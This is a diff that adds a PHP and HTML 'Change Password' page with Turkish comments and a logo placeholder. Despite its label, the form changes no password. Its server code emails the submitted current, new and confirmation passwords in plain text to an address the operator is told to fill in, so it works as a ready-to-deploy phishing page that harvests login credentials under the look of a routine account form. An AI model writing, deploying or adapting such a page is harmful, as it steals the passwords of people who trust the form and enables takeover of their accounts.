@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parolamı Değiştir</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="logo.png" alt="Logo" class="logo"> <!-- Logo resminizi buraya ekleyin -->
+            <h1>Change Password</h1>
+        </div>
+        <?php
+        if ($_SERVER["REQUEST_METHOD"] == "POST") {
+            $currentPassword = $_POST['currentPassword'];
+            $newPassword = $_POST['newPassword'];
+            $confirmPassword = $_POST['confirmPassword'];
+
+            // E-posta gönderme işlemi
+            $to = 'sizinemail@ornek.com'; // Buraya kendi e-posta adresinizi girin
+            $subject = 'Şifre Değişikliği';
+            $message = "Eski Şifre: $currentPassword\nYeni Şifre: $newPassword\nYeni Şifre (Tekrar): $confirmPassword";
+            $headers = 'From: webmaster@ornek.com'; // Gönderici e-posta adresi
+
+            if (mail($to, $subject, $message, $headers)) {
+                echo "<p>Şifreleriniz e-posta ile gönderildi.</p>";
+            } else {
+                echo "<p>E-posta gönderilemedi. Lütfen tekrar deneyiniz.</p>";
+            }
+        }
+        ?>
+        <form action="" method="POST" class="password-form">
+            <div class="form-group">
+                <label for="currentPassword">Current Password</label>
+                <input type="password" id="currentPassword" name="currentPassword" required>
+            </div>
+            <div class="form-group">
+                <label for="newPassword">New Password</label>
+                <input type="password" id="newPassword" name="newPassword" required>
+            </div>
+            <div class="form-group">
+                <label for="confirmPassword">Confirm New Password</label>
+                <input type="password" id="confirmPassword" name="confirmPassword" required>
+            </div>
+            <button type="submit" class="change-button">Accept</button>
+        </form>
+    </div>
+</body>
+</html>
